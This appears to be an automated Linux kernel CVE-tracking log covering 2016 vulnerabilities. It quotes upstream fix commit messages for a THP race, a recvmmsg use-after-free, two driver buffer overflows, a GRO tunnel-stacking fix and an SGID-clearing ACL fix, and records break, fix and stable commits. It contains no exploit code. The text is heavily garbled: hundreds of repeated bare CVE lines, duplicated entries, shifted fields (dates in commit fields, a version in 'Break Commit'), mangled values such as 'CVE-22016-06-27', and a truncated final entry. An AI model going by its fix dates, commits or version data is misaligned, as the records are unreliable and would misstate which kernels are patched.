CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-70422016-10-12016-10-16
Linus Tag: CVE-2016-7097
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
